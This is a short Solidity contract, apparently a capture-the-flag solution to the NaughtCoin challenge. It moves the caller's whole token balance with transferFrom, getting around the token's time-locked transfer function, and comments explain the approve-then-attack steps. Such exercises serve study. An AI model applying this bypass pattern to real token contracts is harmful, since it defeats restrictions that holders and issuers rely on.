// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @dev Remember to first approve this contract on the NaughtCoin contract then call this methods 
/// with the address of the NaughtCoin contract to remove all your tokens!
contract HackNaughtCoin {

    function attack(address naughtCoin) external {
        ERC20(naughtCoin).transferFrom(msg.sender, address(this), ERC20(naughtCoin).balanceOf(msg.sender));
    }
}